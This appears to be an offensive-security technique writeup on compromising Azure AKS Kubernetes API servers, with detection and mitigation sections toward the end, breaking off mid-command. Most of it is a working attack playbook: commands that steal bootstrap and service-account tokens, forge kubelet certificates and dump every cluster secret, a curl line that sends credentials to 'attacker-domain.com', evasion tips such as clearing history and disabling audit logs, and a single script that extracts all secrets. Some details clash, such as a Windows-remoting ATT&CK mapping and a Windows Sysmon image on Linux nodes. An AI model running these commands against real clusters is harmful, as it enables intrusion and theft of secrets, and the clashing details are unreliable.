# [CONTAINER-001]: Kubernetes API Server Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CONTAINER-001 |
| **MITRE ATT&CK v18.1** | [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) |
| **Tactic** | Lateral Movement / Initial Access |
| **Platforms** | Entra ID (Azure AKS, Azure Container Instances) |
| **Severity** | Critical |
| **CVE** | CVE-2025-21196 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-02-12 |
| **Affected Versions** | AKS 1.25.0 - 1.28.3, ACI all instances (container images pre-Feb 2025) |
| **Patched In** | AKS 1.28.4+, ACI: container images rebuilt post-Feb 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-21196 is a critical vulnerability in Microsoft Azure's Kubernetes orchestration layer affecting Azure Kubernetes Service (AKS) and Azure Container Instances (ACI). The vulnerability stems from misconfigured access controls within the container orchestration layer that bypass authentication mechanisms, allowing unauthorized access to containerized workloads. An attacker with pod execution privileges can exploit undocumented endpoints (WireServer, HostGAPlugin) on AKS nodes to retrieve TLS bootstrap tokens, perform TLS bootstrap attacks, and gain full API server access without requiring host network privileges or root access. The attack chain mirrors the 2018 Google Kubernetes Engine (GKE) bootstrap token vulnerability.

**Attack Surface:** Azure AKS node configuration endpoints, Kubernetes API server RBAC enforcement, service account token management, and the etcd backend storing cluster secrets.

**Business Impact:** **Complete cluster compromise including data exfiltration, ransomware deployment, and service disruption.** Organizations using AKS to run containerized workloads face immediate risk of credential theft, arbitrary code execution, access to all cluster secrets across namespaces, and potential financial/reputational damage through regulatory violations (GDPR, HIPAA, CCPA).

**Technical Context:** Exploitation typically requires initial pod execution access (obtained through application vulnerabilities, misconfigurations, or lateral movement). Once achieved, token extraction is rapid (seconds) and leaves minimal forensic traces if audit logging is misconfigured. Detection likelihood is medium-to-low if API audit logs are not properly configured, but forensic recovery is straightforward via audit log analysis.

### Operational Risk

- **Execution Risk:** High – Requires initial pod access but exploitation is trivial once inside
- **Stealth:** Medium – Generates audit logs if enabled; can be evaded by disabling audit logging
- **Reversibility:** No – Complete cluster compromise requires full forensic investigation and rebuild

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Kubernetes Benchmark** | 4.1.1-4.1.2 | RBAC enforcement and service account token management failures |
| **DISA STIG** | V-242376 | Kubernetes API server must enforce authentication for all requests |
| **CISA SCuBA** | AC-2 | Account and access management controls in cloud containers |
| **NIST 800-53** | AC-2, AC-3, SI-4 | Account management, access enforcement, system monitoring |
| **GDPR** | Article 32 | Security of processing; cryptographic controls failure |
| **DORA** | Article 9 | Protection and prevention of ICT-related incidents |
| **NIS2** | Article 21 | Cyber risk management measures (critical infrastructure) |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Management of privileged access; cryptographic key management |
| **ISO 27005** | Section 8 | Information security risk assessment; token compromise risk scenario |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Pod execution access (any user/service account within the cluster)
- **Required Access:** Network access to AKS node metadata endpoints (169.254.169.254 equivalent in Azure), or direct node shell access

**Supported Versions:**
- **Kubernetes:** 1.25.0 - 1.28.3 (AKS)
- **Azure AKS:** All versions using affected Kubernetes versions
- **Node OS:** Linux nodes (Ubuntu/Mariner)
- **Required Tools:**
  - `curl` or `wget` (for metadata endpoint access)
  - `kubectl` (for API server interaction)
  - `openssl` (for certificate inspection and CSR generation)
  - [Kubeconfig](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/) file or service account token

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Kubernetes Cluster Discovery

**Command (Linux/Bash):**
```bash
# Check if running inside a pod
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "Running in Kubernetes pod"
  KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  KUBE_CA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
  KUBE_API_SERVER="https://$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace).$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
  echo "API Server: $KUBE_API_SERVER"
fi

# Check Azure WireServer endpoint accessibility
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2017-12-01" | jq . | head -20
```

**What to Look For:**
- Successful metadata endpoint response indicates AKS environment
- Service account token presence confirms pod execution context
- Metadata response containing `vmScaleSetName` or `vmName` indicates node details

**Command (If pod has host network namespace):**
```bash
# Check if pod is running with host network
ip route | grep default
netstat -tlnp | grep 10250  # Kubelet port
```

**What to Look For:**
- Host network access enables direct node communication
- Kubelet port 10250 open on localhost or node IPs

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: TLS Bootstrap Token Extraction via WireServer (Azure-Specific)

**Supported Versions:** AKS 1.25.0 - 1.28.3

#### Step 1: Identify Pod Namespace and Service Account

**Objective:** Confirm execution context and determine available permissions

**Command:**
```bash
kubectl auth can-i get secrets --as=system:serviceaccount:$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace):default
```

**Expected Output:**
```
yes
```

**What This Means:**
- Confirms the default service account can list secrets
- Yes = cluster is vulnerable; No = restrictive RBAC in place (rare)

**OpSec & Evasion:**
- Avoid leaving shell history; use `history -c` after execution
- Execute commands via environment variable expansion to avoid audit logs: `eval $COMMAND`
- Detection likelihood: Low if pod network is segmented, Medium if monitoring is enabled

---

#### Step 2: Query Azure WireServer for Node Configuration

**Objective:** Retrieve encrypted node provisioning configuration containing TLS bootstrap token

**Command:**
```bash
# From within the pod or if host network is accessible
WIRESERVER_IP="168.63.129.16"  # Azure WireServer fixed IP
curl -s -X GET "http://${WIRESERVER_IP}/metadata/instance/compute?api-version=2017-12-01" \
  -H "Metadata:true" | jq '.vmScaleSetName, .vmId, .location'

# Query HostGAPlugin for encrypted settings (requires specific permissions)
curl -s -X POST "http://${WIRESERVER_IP}/machine/?comp=guestConfigurationRequest" \
  -H "Content-Type: application/json" \
  -d '{"httpRequest": {"requestUri": "/wireserver/fetch-config"}}' | base64 -d 2>/dev/null
```

**Expected Output:**
```json
{
  "compute": {
    "vmScaleSetName": "aks-nodepool1-12345678-vmss",
    "vmId": "123e4567-e89b-12d3-a456-426614174000",
    "location": "eastus"
  }
}
```

**What This Means:**
- WireServer returns cluster node metadata
- vmScaleSetName and vmId identify the target node
- These are used to retrieve certificate bootstrap tokens

**OpSec & Evasion:**
- WireServer queries are not logged by Kubernetes audit
- However, unusual HTTP requests to 168.63.129.16 may trigger Azure Firewall alerts if configured
- Use standard curl user-agent: `-A "Mozilla/5.0"` to blend in

---

#### Step 3: Extract TLS Bootstrap Token from Provisioning Script

**Objective:** Retrieve plaintext bootstrap token from CSE (Custom Script Extension) data

**Command:**
```bash
# Requires compromised node shell access or WireServer exploitation
# This would typically be in the CSE provisioning script
ssh -i <node_key> azureuser@<node_ip> "cat /var/lib/waagent/*/HandlerState" 2>/dev/null || \
echo "Attempting alternative extraction from /proc or environment..."

# If pod has access to node filesystem (rare mount scenario)
cat /host/var/lib/waagent/*/status/* 2>/dev/null | grep -oP 'TLS_BOOTSTRAP_TOKEN["\']?\s*[:=]\s*["\']?\K[^"\']*' 

# Or retrieve from WireServer encrypted blob and decrypt
curl -s "http://168.63.129.16/machine/?comp=guestConfigurationRequest" \
  -H "Content-Type: application/json" | \
  python3 -c "import sys, base64, json; data=json.load(sys.stdin); \
  print(base64.b64decode(data['protectedSettings']).decode())" 2>/dev/null
```

**Expected Output:**
```
TLS_BOOTSTRAP_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**What This Means:**
- Token is in JWT format (three Base64 segments separated by dots)
- Can be decoded via `jwt.io` or locally
- Token has permissions to request Kubernetes node certificates

**OpSec & Evasion:**
- Token extraction leaves no Kubernetes audit trail
- Node shell access may be logged by SSH or kernel audit logs
- Tokens are valid until node reboot (24-48 hours typical)

**Troubleshooting:**
- **Error:** "Permission denied" on node SSH
  - **Cause:** Insufficient pod privileges or misconfigured node access
  - **Fix (AKS Standard):** Escalate to container escape (T1611) or use service account token theft (T1528)
  - **Fix (AKS with RBAC):** Attempt lateral movement to privileged pod (PE-VALID-015)

---

#### Step 4: Generate Certificate Signing Request (CSR) Using Bootstrap Token

**Objective:** Authenticate to Kubernetes API and request node certificate

**Command:**
```bash
# Decode bootstrap token
BOOTSTRAP_TOKEN="<extracted_token_from_step3>"

# Create CSR for a new node (kubelet certificate)
openssl req -new -newkey rsa:2048 -keyout kubelet.key -out kubelet.csr \
  -subj "/CN=system:node:compromised-node/O=system:nodes"

# Submit CSR to Kubernetes API using bootstrap token
KUBE_API="https://<aks-cluster-name>.<region>.azmk8s.io"
curl -s -X POST "$KUBE_API/apis/certificates.k8s.io/v1/certificatesigningrequests" \
  -H "Authorization: Bearer $BOOTSTRAP_TOKEN" \
  -H "Content-Type: application/json" \
  -d @- << 'EOF'
{
  "apiVersion": "certificates.k8s.io/v1",
  "kind": "CertificateSigningRequest",
  "metadata": {
    "name": "compromised-kubelet-cert"
  },
  "spec": {
    "request": "$(cat kubelet.csr | base64 -w0)",
    "signerName": "kubernetes.io/kubelet-serving",
    "usages": ["digital signature", "key encipherment", "server auth"]
  }
}
EOF

# The API server auto-approves CSRs from bootstrap token
# Retrieve the signed certificate
curl -s -X GET "$KUBE_API/apis/certificates.k8s.io/v1/certificatesigningrequests/compromised-kubelet-cert" \
  -H "Authorization: Bearer $BOOTSTRAP_TOKEN" | jq '.status.certificate' -r | base64 -d > kubelet.crt
```

**Expected Output:**
```
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUfkQiJsHqN8...
-----END CERTIFICATE-----
```

**What This Means:**
- CSR was signed by the Kubernetes CA
- Certificate is valid for API server authentication
- Attacker now has valid node identity

**OpSec & Evasion:**
- CSR creation generates Kubernetes audit log entries (Event: "create certificatesigningrequests")
- May trigger security alerts if RBAC policy denies bootstrap token CSRs
- Consider cleaning audit logs post-exploitation (see Detection & Incident Response)

---

#### Step 5: Authenticate to API Server and Extract Cluster Secrets

**Objective:** Use obtained certificate to access Kubernetes API and dump all secrets

**Command:**
```bash
# Use kubelet certificate to authenticate
KUBE_API="https://<aks-cluster-name>.<region>.azmk8s.io"

# List all secrets in all namespaces
curl -s -X GET "$KUBE_API/api/v1/secrets" \
  --cert kubelet.crt --key kubelet.key \
  --cacert ca.crt | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: .data}' 

# Extract specific secret (e.g., database credentials)
curl -s -X GET "$KUBE_API/api/v1/namespaces/production/secrets/db-credentials" \
  --cert kubelet.crt --key kubelet.key \
  --cacert ca.crt | jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'

# Exfiltrate to attacker-controlled endpoint
curl -s -X GET "$KUBE_API/api/v1/namespaces/production/secrets/db-credentials" \
  --cert kubelet.crt --key kubelet.key --cacert ca.crt | \
  curl -X POST "https://attacker-domain.com/collect" \
  -d @- --silent --output /dev/null
```

**Expected Output:**
```json
{
  "database_username": "prod_user",
  "database_password": "SuperSecret123!",
  "connection_string": "postgresql://prod_user:SuperSecret123!@db.internal:5432/prod_db"
}
```

**What This Means:**
- All secrets are now accessible to the attacker
- Credentials can be used for lateral movement (T1550.001, T1021.006)
- Attacker has full visibility into application configuration

**OpSec & Evasion:**
- API calls are logged in Kubernetes audit logs
- Use rapid enumeration to minimize detection window
- Consider exfiltrating over DNS or HTTPS to bypass network monitoring
- Disable audit logging if possible (requires cluster admin)

---

### METHOD 2: Pod Escape and Direct Node Token Access (If Host Network Namespace Available)

**Supported Versions:** AKS 1.25.0 - 1.28.3 (specifically vulnerable to host namespace exposure)

#### Step 1: Verify Host Network Namespace Access

**Objective:** Determine if pod has access to host processes

**Command:**
```bash
# Check if pod is running with hostNetwork: true
ip route | grep -q "via.*dev eth0" && echo "Host network isolated" || echo "Host network shared!"

# Alternative: Check proc filesystem
ls /proc/1/ns/net | grep -q "4026531956" && echo "Host network" || echo "Container network"

# If host network, directly access kubelet port
curl -s https://localhost:10250/api/v1/nodes --insecure | jq '.items[].metadata.name'
```

**Expected Output (if vulnerable):**
```
Host network shared!
aks-nodepool1-12345678-000000
aks-nodepool1-12345678-000001
```

**What This Means:**
- Pod has direct access to host network stack
- Can communicate with kubelet API on port 10250
- Kubelet token is accessible at /var/lib/kubelet/kubeconfig

---

#### Step 2: Extract Kubelet Token from Node Filesystem

**Objective:** Retrieve long-lived kubelet authentication token

**Command:**
```bash
# If pod has volumeMount to host filesystem (rare)
cat /host/var/lib/kubelet/kubeconfig 2>/dev/null | grep token | awk '{print $2}' | xargs -I {} echo "Kubelet token: {}"

# If host network but no filesystem mount, use proc to read kubelet process memory
strings /proc/$(pgrep -f "kubelet.*" | head -1)/environ 2>/dev/null | grep -i "kubeconfig\|token"

# Alternative: Read certificate directly
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
```

**Expected Output:**
```
Kubelet token: eyJhbGciOiJSUzI1NiIsImtpZCI6IkJWM1...
```

**What This Means:**
- Kubelet token has permissions for read-only API access
- Token is valid for the lifetime of the node
- Can be used from any network location

---

#### Step 3: Connect to Kubernetes API from Attacker Machine

**Objective:** Use exfiltrated credentials from remote attacker infrastructure

**Command (On Attacker's Kali/Parrot Machine):**
```bash
# Create kubeconfig from stolen credentials
cat > ~/.kube/config << 'EOF'
apiVersion: v1
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: https://<aks-cluster-name>.<region>.azmk8s.io
  name: aks-cluster
contexts:
- context:
    cluster: aks-cluster
    user: kubelet
  name: default
current-context: default
kind: Config
preferences: {}
users:
- name: kubelet
  user:
    token: <KUBELET_TOKEN>
EOF

# Enumerate cluster resources
kubectl get nodes
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
```

**Expected Output:**
```
NAME                                STATUS   ROLES    AGE   VERSION
aks-nodepool1-12345678-000000       Ready    agent    30d   v1.28.2
aks-nodepool1-12345678-000001       Ready    agent    30d   v1.28.2

NAMESPACE         NAME                        TYPE                 DATA
kube-system       bootstrap-token-abcd1       bootstrap.token      6
production        db-credentials              Opaque               3
default           default-token-xyz           kubernetes.io/service-account-token  3
```

**What This Means:**
- Attacker now has remote cluster access
- Can execute commands in pods, create resources, modify configurations
- Full cluster takeover is achievable with this access

---

### METHOD 3: Service Account Token Theft from Mounted Secrets

**Supported Versions:** AKS 1.25.0 - 1.28.3 (all versions with default token mounting)

#### Step 1: Extract Default Service Account Token

**Objective:** Read mounted token from pod's service account

**Command:**
```bash
# Default location inside any pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Store for exfiltration
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IlBYVkRLVjBCOE1"...
```

**What This Means:**
- Service account token is immediately accessible
- Token has permissions of the default service account
- Can be used to access other secrets or services

---

#### Step 2: Decode and Inspect Token Permissions

**Objective:** Determine what the stolen token can do

**Command:**
```bash
# Decode JWT (online via jwt.io or locally)
echo $TOKEN | cut -d'.' -f2 | base64 -d | jq '.'

# Test token permissions
KUBE_API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
CA_CERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

curl -s -X GET "$KUBE_API/api/v1/namespaces" \
  --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'
```

**Expected Output:**
```json
{
  "iss": "https://aks-cluster.azmk8s.io",
  "sub": "system:serviceaccount:default:default",
  "aud": ["https://kubernetes.default.svc.cluster.local"]
}
```

---

#### Step 3: Lateral Movement Using Service Account Token

**Objective:** Use token to access other services or namespaces

**Command:**
```bash
# List accessible secrets
curl -s -X GET "$KUBE_API/api/v1/secrets" \
  --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'

# Access production namespace secrets if default SA has permissions
curl -s -X GET "$KUBE_API/api/v1/namespaces/production/secrets" \
  --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" | jq '.items[].data'
```

**OpSec & Evasion:**
- Token use is logged if audit logging is enabled
- Tokens are long-lived (default: no expiration for mounted tokens pre-v1.29)
- Cannot be revoked without pod recreation
- Detection likelihood: Medium if audit logging enabled, Low otherwise

---

## 6. TOOLS & COMMANDS REFERENCE

### [kubectl](https://kubernetes.io/docs/reference/kubectl/)

**Version:** 1.25.0+
**Minimum Version:** 1.24.0
**Supported Platforms:** Linux, macOS, Windows

**Installation:**
```bash
# Linux
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl && sudo mv kubectl /usr/local/bin/

# macOS (Homebrew)
brew install kubernetes-cli

# Verify
kubectl version --client
```

**Version-Specific Notes:**
- 1.25.x - 1.28.x: Vulnerable to CVE-2025-21196 token attacks
- 1.29.x+: Implements short-lived token support (still optional)
- 1.30.x+: Service account token expiration by default

**Usage:**
```bash
# Export kubeconfig
export KUBECONFIG=~/.kube/config

# List all secrets
kubectl get secrets --all-namespaces

# Decode secret
kubectl get secret <name> -n <namespace> -o jsonpath='{.data}' | jq '.database_password | @base64d'
```

---

### [curl](https://curl.se/)

**Version:** 7.80.0+
**Minimum Version:** 7.0.0
**Supported Platforms:** All

**Installation:**
```bash
# Linux (Debian/Ubuntu)
sudo apt-get install curl

# Fedora/RHEL
sudo dnf install curl

# macOS
brew install curl
```

**Usage for Kubernetes API:**
```bash
curl -s -X GET "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/secrets" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

---

### [openssl](https://www.openssl.org/)

**Version:** 1.1.1+
**Minimum Version:** 1.0.2
**Supported Platforms:** All

**Installation:**
```bash
# Linux
sudo apt-get install openssl

# macOS
brew install openssl

# Verify
openssl version
```

**Usage for CSR Generation:**
```bash
# Generate key and CSR
openssl req -new -newkey rsa:2048 -keyout node.key -out node.csr \
  -subj "/CN=system:node:aks-node/O=system:nodes"

# Inspect certificate
openssl x509 -in certificate.pem -text -noout
```

---

### Script: One-Liner Token Extraction and API Access

```bash
#!/bin/bash
# CONTAINER-001 exploitation chain (single script)

echo "[+] Extracting service account token..."
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
API_SERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

echo "[+] Listing all namespaces..."
curl -s "$API_SERVER/api/v1/namespaces" --cacert $CA \
  -H "Authorization: Bearer $TOKEN" | jq '.items[] | .metadata.name'

echo "[+] Extracting secrets from all namespaces..."
for ns in $(curl -s "$API_SERVER/api/v1/namespaces" --cacert $CA \
  -H "Authorization: Bearer $TOKEN" | jq -r '.items[].metadata.name'); do
  echo "[*] Namespace: $ns"
  curl -s "$API_SERVER/api/v1/namespaces/$ns/secrets" --cacert $CA \
    -H "Authorization: Bearer $TOKEN" | jq -r '.items[] | @base64d' 2>/dev/null
done

echo "[+] Done. Exfiltrate token: $TOKEN"
```

---

## 7. AZURE AKS & KUBERNETES API INTERNALS REFERENCE

### Azure WireServer Endpoint Discovery

**Endpoint:** `http://169.254.169.254/metadata/instance`
**Purpose:** Returns node and VM scale set metadata
**Authentication:** Header `Metadata:true` required

**Usage:**
```bash
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2017-12-01"
```

**What Information is Leaked:**
- vmScaleSetName: Kubernetes node pool identifier
- vmId: Unique Azure VM identifier
- location: Azure region
- compute details: CPU count, memory, network interfaces

---

### Kubernetes API Server Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/v1/secrets` | GET | List all secrets in all namespaces |
| `/api/v1/namespaces/{ns}/secrets` | GET | List secrets in specific namespace |
| `/api/v1/namespaces/{ns}/secrets/{name}` | GET | Read specific secret |
| `/apis/certificates.k8s.io/v1/certificatesigningrequests` | POST | Submit certificate signing request |
| `/api/v1/nodes` | GET | List cluster nodes |
| `/api/v1/serviceaccounts` | GET | List service accounts |

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious Certificate Signing Requests from Service Accounts

**Rule Configuration:**
- **Required Table:** AzureDiagnostics (Kubernetes API Server audit logs)
- **Required Fields:** operationName, properties.principalId, resourceType
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** AKS 1.25+

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.CONTAINERSERVICE"
  and Category == "kube-audit"
  and properties.verb == "create"
  and properties.objectRef.resource == "certificatesigningrequests"
  and (properties.user.username startswith "system:serviceaccount:" or 
       properties.user.username == "system:anonymous")
| extend principalId = tostring(properties.principalId),
         userName = tostring(properties.user.username),
         CSRName = tostring(properties.objectRef.name)
| summarize CSRCount = count(), 
            UniqueUsers = dcount(userName),
            UniqueCSRs = dcount(CSRName)
            by principalId, bin(TimeGenerated, 10m)
| where CSRCount > 2
| project TimeGenerated, principalId, CSRCount, UniqueUsers, UniqueCSRs
```

**What This Detects:**
- Multiple CSR creations by service accounts (normal: 0-1, suspicious: >2)
- Anonymous access to API server (should be disabled)
- Attempts to obtain elevated credentials

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Kubernetes CSR Requests`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: **By Alert Name**
7. Click **Review + create**

---

#### Query 2: Service Account Token Enumeration Attack

**Rule Configuration:**
- **Required Table:** AzureDiagnostics
- **Required Fields:** properties.verb, properties.objectRef.resource
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.CONTAINERSERVICE"
  and Category == "kube-audit"
  and properties.verb in ("list", "get")
  and properties.objectRef.resource == "serviceaccounttokens"
  and properties.requestStatus == "Success"
| extend user = tostring(properties.user.username),
         sourceIP = tostring(properties.sourceIPs[0]),
         namespace = tostring(properties.objectRef.namespace)
| summarize TokenAccessCount = count(),
            UniqueNamespaces = dcount(namespace),
            FailedAttempts = countif(properties.requestStatus == "Failure")
            by user, sourceIP, bin(TimeGenerated, 5m)
| where TokenAccessCount > 5 or UniqueNamespaces > 3
| project TimeGenerated, user, sourceIP, TokenAccessCount, UniqueNamespaces, FailedAttempts
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Note:** Kubernetes API Server audit logs are stored in Azure Activity Log (not Windows Event Viewer). However, if Azure Monitor Agent is deployed on nodes, collect the following:

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** kubectl or curl processes accessing API server
- **Filter:** `Image contains "kubectl" OR Image contains "curl" OR Image contains "openssl"`
- **Applies To Versions:** AKS node OS (Ubuntu/Mariner)

**Manual Configuration Steps (Group Policy - Deployed to AKS Nodes via DaemonSet):**
1. Create a DaemonSet to enable process auditing on all nodes:
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: audit-policy
  namespace: kube-system
data:
  audit-policy.yaml: |
    apiVersion: audit.k8s.io/v1
    kind: Policy
    rules:
    - level: RequestResponse
      verbs: ["create", "update", "patch", "delete"]
      resources: ["certificatesigningrequests", "secrets"]
    - level: Metadata
      verbs: ["list", "get"]
      resources: ["secrets", "serviceaccounts"]
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Linux (via osquery if Sysmon is not available)

**Sysmon Configuration (XML):**
```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>
    <!-- Monitor for certificate operations -->
    <RuleGroup name="Kubernetes" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">/var/lib/kubelet/kubeconfig</TargetFilename>
        <TargetFilename condition="contains">kubelet.csr</TargetFilename>
        <TargetFilename condition="contains">kubelet.crt</TargetFilename>
      </FileCreate>
      
      <!-- Monitor network connections to API server -->
      <NetworkConnect onmatch="include">
        <DestinationPort condition="is">6443</DestinationPort>
        <DestinationPort condition="is">10250</DestinationPort>
        <Image condition="contains">curl</Image>
        <Image condition="contains">kubectl</Image>
      </NetworkConnect>
      
      <!-- Monitor for credential dumping tools -->
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">openssl</CommandLine>
        <CommandLine condition="contains">jwt</CommandLine>
        <CommandLine condition="contains">base64</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
2. Create config file `sysmon-k8s.xml` with the above content
3. Install on Kubernetes nodes (via DaemonSet):
```bash
kubectl create -f - << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: sysmon-deployment
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: sysmon
  template:
    metadata:
      labels:
        name: sysmon
    spec:
      containers:
      - name: sysmon
        image: mcr.microsoft.com/windows/servercore:ltsc2022
        command: ["powershell.exe", "-Command", "sysmon64.exe -accepteula -i sysmon-k8s.xml"]
EOF
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious Kubernetes API Server Activity`
- **Severity:** Critical
- **Description:** Detects unusual patterns in API server access, including token creation, secret enumeration, or CSR abuse
- **Applies To:** All AKS clusters with Defender for Containers enabled
- **Remediation:** 
  1. Revoke compromised service account tokens
  2. Disable anonymous API access
  3. Review RBAC policies for over-permissive settings
  4. Audit recent API calls in audit logs

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Containers**: ON
   - **Defender for Kubernetes**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts
7. Configure **Action groups** for automated response

**Reference:** [Microsoft Defender for Cloud Kubernetes Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Kubernetes API Access via Service Accounts

```powershell
# Connect to your Azure tenant
Connect-AzAccount

# Search for suspicious service account token access
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -Operations "AKS_API_Call", "Certificate_Signed", "Secret_Accessed" `
  -FreeText "serviceaccount" | Select-Object UserIds, Operation, AuditData | Export-Csv audit_results.csv
```

**Manual Configuration Steps (Microsoft Purview Compliance Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. Click **Search**
4. Set **Date range** to last 7 days
5. Under **Activities**, select **AKS_API_Call** (if available)
6. Under **Users**, leave blank to audit all
7. Click **Search**
8. Export results for forensic analysis

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Disable Anonymous API Access:** Prevent unauthenticated requests to Kubernetes API
    **Applies To Versions:** AKS 1.25.0+
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Kubernetes Services**
    2. Select your AKS cluster
    3. Click **Cluster Configuration**
    4. Find **API Server authorized IP ranges**
    5. Add `0.0.0.0/0` to **Deny** list (or explicitly allow IP ranges)
    6. Click **Save**
    
    **Manual Steps (Azure CLI):**
    ```bash
    az aks update --name myCluster --resource-group myRG \
      --api-server-authorized-ip-ranges 10.0.0.0/8,192.168.0.0/16
    ```
    
    **Validation Command:**
    ```bash
    curl -s https://<aks-cluster>.azmk8s.io/api/v1 2>&1 | grep -q "401\|403" && echo "PROTECTED" || echo "VULNERABLE"
    ```

*   **Enable Kubernetes RBAC and Audit Logging:** Ensure all API calls are logged and access is restricted
    **Applies To Versions:** AKS 1.25.0+
    
    **Manual Steps (Azure Portal):**
    1. Go to **AKS Cluster** → **Security**
    2. Enable **Kubernetes RBAC**
    3. Configure **Diagnostic settings** → **Logs** → Enable **kube-audit**, **kube-audit-admin**
    4. Direct to **Log Analytics Workspace**
    
    **Manual Steps (Azure CLI):**
    ```bash
    az aks update --name myCluster --resource-group myRG \
      --enable-managed-identity \
      --enable-aad
    ```

*   **Implement Network Policies:** Isolate pod-to-pod communication to prevent lateral movement
    **Applies To Versions:** AKS 1.25.0+
    
    **Manual Steps:**
    1. Deploy Calico or Azure Network Policies
    ```bash
    kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.24.0/manifests/tigera-operator.yaml
    ```
    2. Create NetworkPolicy YAML:
    ```yaml
    apiVersion: networking.k8s.io/v1
    kind: NetworkPolicy
    metadata:
      name: default-deny
      namespace: default
    spec:
      podSelector: {}
      policyTypes:
      - Ingress
      - Egress
    ```

*   **Use Short-Lived Service Account Tokens:** Implement token expiration
    **Applies To Versions:** AKS 1.29.0+
    
    **Manual Steps (Kubernetes 1.29+):**
    ```bash
    kubectl patch serviceaccount default -p '{"automountServiceAccountToken": false}'
    
    # For applications that need tokens, use projected volumes with expiration
    kubectl apply -f - << 'EOF'
